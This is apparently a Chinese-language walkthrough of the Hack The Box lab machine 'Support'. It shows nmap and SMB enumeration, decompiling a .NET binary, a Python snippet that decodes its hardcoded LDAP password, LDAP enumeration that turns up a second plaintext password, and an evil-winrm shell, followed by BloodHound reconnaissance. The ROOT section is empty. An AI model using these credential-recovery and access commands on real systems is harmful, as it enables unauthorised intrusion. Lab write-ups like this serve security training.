---
description: Easy / 分析程序文件 / LDAP枚举 /
---

# ✔️ Support

## 建立立足点

### 信息收集

* 使用Nmap对目标开放端口进行扫描：

```bash
nmap -sC -sV -p- -oA support 10.129.230.181 --open
```

<figure><img src="../../.gitbook/assets/1 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/2 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 先进行SMB匿名登录测试，发现可以登录上去，且有感兴趣的共享文件/support-tools（这种和靶机名称一致的提示还是蛮明显的）：

```bash
smbclient -N -L 10.129.230.181
```

<figure><img src="../../.gitbook/assets/3 (9).png" alt=""><figcaption></figcaption></figure>

* 分别尝试把这些共享文件递归下载到本地，也发现只有/support-tools的可以下载，其他的都拒绝：

```bash
smbclient //10.129.230.181/support-tools
RECURSE ON
PROMPT OFF
mget *
```

<figure><img src="../../.gitbook/assets/4 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/5 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/6 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 下载到Kali本地后，查看发现都是exe文件和一个压缩包文件，名称是UserInfo，猜测可能包含用户信息：

<figure><img src="../../.gitbook/assets/7 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 解压UserInfo.exe.zip，比较感兴趣的有config文件和exe文件：

<figure><img src="../../.gitbook/assets/8 (1).png" alt=""><figcaption></figcaption></figure>

* config文件，有.NET框架的版本号信息，其他的好像没什么了：

<figure><img src="../../.gitbook/assets/9 (1).png" alt=""><figcaption></figcaption></figure>

* 没有预期的任何凭证之类的内容，用enum4linux枚举也无任何收获：

```bash
enum4linux 10.129.230.181
```

<figure><img src="../../.gitbook/assets/10 (1).png" alt=""><figcaption></figcaption></figure>

* smbmap也没有收获：

```bash
smbmap -H 10.129.230.181 -u "" -p ""
```

<figure><img src="../../.gitbook/assets/11 (8).png" alt=""><figcaption></figcaption></figure>

* 尝试RPC空密码连接被拒绝：

```bash
rpcclient 10.129.230.181
```

<figure><img src="../../.gitbook/assets/12 (9).png" alt=""><figcaption></figcaption></figure>

* 回到刚才解压出来的UserInfo.exe，查看其信息：

```bash
file UserInfo.exe
```

<figure><img src="../../.gitbook/assets/13 (9).png" alt=""><figcaption></figcaption></figure>

* 把这个exe文件放入Windows系统中运行试试，这里要把整个解压出来的所有文件都一起放进Windows中，不然会运行不成功：

<figure><img src="../../.gitbook/assets/14 (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/15 (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/16 (6).png" alt=""><figcaption></figcaption></figure>

* 因为当前没有收集到可以用的用户名，所以直接运行该程序没用：

<figure><img src="../../.gitbook/assets/17 (5).png" alt=""><figcaption></figcaption></figure>

* 把UserInfo.exe放入dnspy中分析其代码：

<figure><img src="../../.gitbook/assets/18 (6).png" alt=""><figcaption></figcaption></figure>

* 在protected目录下的.cctor()中找到编码后的密码：

<figure><img src="../../.gitbook/assets/19 (1).png" alt=""><figcaption></figcaption></figure>

* python IDLE终端解码后得到明文密码：'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

```python
from base64 import b64decode
from itertools import cycle
pass_b64 = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
enc = b64decode(pass_b64)
[e^k^223 for e,k in zip(enc, cycle(key))]
bytearray([e^k^223 for e,k in zip(enc, cycle(key))]).decode()
```

<figure><img src="../../.gitbook/assets/20 (1).png" alt=""><figcaption></figcaption></figure>

* 使用crackmapexec验证一下凭证是否有用：

```bash
crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

<figure><img src="../../.gitbook/assets/21 (1).png" alt=""><figcaption></figcaption></figure>

### GET SHELL

* 因为该程序的代码中的ldapquery，用的是ldap协议，所以用ldapsearch和当前已获得的有效凭证列举出AD中所有的内容：

<figure><img src="../../.gitbook/assets/23 (1).png" alt=""><figcaption></figcaption></figure>

```bash
ldapsearch -H  'ldap://10.129.230.181' -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

* 输出结构特别多，需要仔细查看才能发现其中的support账户里包含了一个info字段，里面的字符串看上去像是密码（因为其他账户没有info这个字段）：

<figure><img src="../../.gitbook/assets/24 (1).png" alt=""><figcaption></figcaption></figure>

* 尝试使用evil-winrm和这个凭证连接，获取到了shell：

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

<figure><img src="../../.gitbook/assets/25 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/26 (3).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息收集

* 上传winPEAS.exe到目标系统进行信息枚举，没什么特别收获：

<figure><img src="../../.gitbook/assets/27 (3).png" alt=""><figcaption></figcaption></figure>

* 上传sharphound.exe收集信息到bloodhound里进行分析：

<figure><img src="../../.gitbook/assets/28 (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/29 (3).png" alt=""><figcaption></figcaption></figure>

* 运行bloodhound把zip包拖进去即可：

<figure><img src="../../.gitbook/assets/30 (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/31 (2).png" alt=""><figcaption></figcaption></figure>



### ROOT





















{% hint style="info" %}
本例虽然是被归类为简单机器，但是涉及到自己的盲区较多，看的提示较多完成度不高，对我来讲算难的机器。
{% endhint %}
